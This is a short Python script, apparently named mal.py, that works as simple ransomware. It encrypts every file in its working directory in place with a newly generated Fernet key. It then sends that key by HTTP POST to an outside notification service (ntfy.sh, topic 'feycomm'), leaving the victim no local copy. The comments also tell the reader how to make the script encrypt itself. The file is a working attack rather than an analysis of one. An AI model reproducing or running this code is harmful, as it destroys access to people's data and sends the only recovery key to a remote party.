import os
from http.client import HTTPConnection
from cryptography.fernet import Fernet

key = Fernet.generate_key()

files = []
for file in os.listdir():
    if file != "mal.py": # remove this
        if os.path.isfile(file): # and this 
            files.append(file) # and fix indentation here to encrypt the mal.py file as well :)

for file in files:
    with open(file, "rb") as cur_file: content = cur_file.read()
    enc_content = Fernet(key).encrypt(content)
    with open(file, "wb") as enc_file: enc_file.write(enc_content)


conn = HTTPConnection("ntfy.sh", 80)
conn.request("POST", '/feycomm', key)
response = conn.getresponse()
print(response.status, response.reason)
